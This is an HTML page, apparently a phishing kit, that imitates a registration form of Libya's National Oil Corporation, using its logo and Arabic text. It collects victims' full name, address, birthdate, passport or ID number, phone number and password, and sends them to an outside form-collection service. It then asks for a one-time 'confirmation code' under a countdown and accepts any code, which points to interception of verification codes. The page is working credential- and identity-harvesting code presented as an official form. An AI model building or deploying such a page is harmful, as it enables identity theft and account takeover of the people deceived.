<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تسجيل البيانات - المؤسسة الوطنية للنفط</title>
  <style>
    body {
      font-family: 'Tahoma', sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .form-container {
      background-color: #f7f9fc;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.08);
      width: 100%;
      max-width: 460px;
      border-top: 10px solid #002147;
      position: relative;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      max-width: 100px;
      height: auto;
    }

    h2 {
      text-align: center;
      color: #002147;
      margin-bottom: 25px;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: #002147;
      font-weight: bold;
    }

    input[type="text"],
    input[type="tel"],
    input[type="date"],
    input[type="password"],
    select {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      background-color: #fff;
    }

    input:disabled {
      background-color: #eee;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #d71920;
      border: none;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #b1151a;
    }

    .code-popup {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background: #ffffff;
      border: 1px solid #ccc;
      border-radius: 12px;
      padding: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
      display: none;
      width: 300px;
      z-index: 1000;
    }

    .code-popup h4 {
      margin-top: 0;
      margin-bottom: 10px;
      color: #002147;
    }

    .code-popup input {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    .code-popup .error {
      color: red;
      font-size: 13px;
      display: none;
    }

    .countdown {
      font-size: 14px;
      color: #444;
      margin-bottom: 10px;
    }

    /* زر 👁️ لحقل الرقم السري */
    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-left: 40px;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      color: #555;
      font-size: 18px;
      user-select: none;
    }

    input[type="date"] {
      background: url('https://img.icons8.com/ios-glyphs/30/calendar--v1.png') no-repeat left center;
      background-size: 20px;
      padding-left: 35px;
      background-color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="form-container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3d/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط">
  </div>
  <h2>تسجيل البيانات - المؤسسة الوطنية للنفط</h2>
  <form id="userForm">
    <div class="form-group">
      <label for="name">الاسم الكامل</label>
      <input type="text" id="name" name="name" required />
    </div>

    <div class="form-group">
      <label for="address">العنوان</label>
      <input type="text" id="address" name="address" required />
    </div>

    <div class="form-group">
      <label for="birthdate">تاريخ الميلاد</label>
      <input type="date" id="birthdate" name="birthdate" required />
    </div>

    <div class="form-group">
      <label for="documentType">نوع الوثيقة</label>
      <select id="documentType" name="documentType" required>
        <option value="">-- اختر نوع الوثيقة --</option>
        <option value="جواز سفر">جواز سفر</option>
        <option value="بطاقة شخصية">بطاقة شخصية</option>
      </select>
    </div>

    <div class="form-group">
      <label for="documentNumber">رقم الوثيقة</label>
      <input type="text" id="documentNumber" name="documentNumber" required />
    </div>

    <div class="form-group">
      <label for="phone">رقم الهاتف</label>
      <input type="tel" id="phone" name="phone" placeholder="2189XXXXXXXX" required />
    </div>

    <div class="form-group password-wrapper">
      <label for="password">الرقم السري</label>
      <input type="password" id="password" name="password" placeholder="6 أحرف أو أكثر" required />
      <span class="toggle-password" onclick="togglePassword()">👁️</span>
    </div>

    <button type="submit">إرسال</button>
  </form>
</div>

<div class="code-popup" id="codePopup">
  <h4>أدخل كود التأكيد</h4>
  <div class="countdown" id="countdown">08:00</div>
  <input type="text" id="confirmCode" maxlength="8" placeholder="6 إلى 8 رموز" />
  <div class="error" id="codeError">يرجى إدخال كود من 6 إلى 8 رموز فقط.</div>
  <button onclick="validateCode()">تأكيد</button>
</div>

<script>
  const form = document.getElementById('userForm');
  const codePopup = document.getElementById('codePopup');
  const confirmCodeInput = document.getElementById('confirmCode');
  const codeError = document.getElementById('codeError');
  const countdownEl = document.getElementById('countdown');
  let countdownInterval;

  form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const password = document.getElementById('password').value.trim();

    if (password.length < 6) {
      alert("الرقم السري يجب أن يكون 6 خانات أو أكثر.");
      return;
    }

    const formData = new FormData(form);

    try {
      const response = await fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        Array.from(form.elements).forEach(el => el.disabled = true);
        codePopup.style.display = 'block';
        startCountdown(8 * 60);
      } else {
        alert("فشل في إرسال البيانات، حاول لاحقًا.");
      }
    } catch (error) {
      alert("حدث خطأ في الاتصال.");
      console.error(error);
    }
  });

  function validateCode() {
    const code = confirmCodeInput.value.trim();

    if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
      codeError.style.display = 'none';
      confirmCodeInput.disabled = true;
      window.location.href = "success.html";
    } else {
      codeError.style.display = 'block';
    }
  }

  function startCountdown(seconds) {
    let remaining = seconds;

    countdownInterval = setInterval(() => {
      let mins = Math.floor(remaining / 60);
      let secs = remaining % 60;
      countdownEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

      if (remaining <= 0) {
        clearInterval(countdownInterval);
        confirmCodeInput.disabled = true;
        codeError.textContent = "انتهى وقت الكود. الرجاء المحاولة من جديد.";
        codeError.style.display = 'block';
      }

      remaining--;
    }, 1000);
  }

  function togglePassword() {
    const passwordInput = document.getElementById("password");
    const toggleIcon = document.querySelector(".toggle-password");

    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      toggleIcon.textContent = "🙈";
    } else {
      passwordInput.type = "password";
      toggleIcon.textContent = "👁️";
    }
  }
</script>

</body>
</html>
